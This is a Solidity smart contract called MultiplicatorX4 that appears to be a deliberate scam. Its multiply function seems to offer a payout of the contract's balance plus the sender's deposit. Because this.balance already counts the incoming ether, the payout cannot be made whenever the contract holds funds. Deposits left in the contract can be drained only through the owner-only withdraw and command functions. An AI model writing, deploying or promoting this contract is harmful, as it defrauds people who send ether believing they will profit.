pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner;

    function MultiplicatorX4() public {
        owner = msg.sender;
    }

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _target, bytes _data) public payable {
        require(msg.sender == owner);
        require(_target.call.value(msg.value)(_data));
    }

    function multiply(address _target) public payable {
        require(msg.value >= this.balance);
        _target.transfer(this.balance + msg.value);
    }
}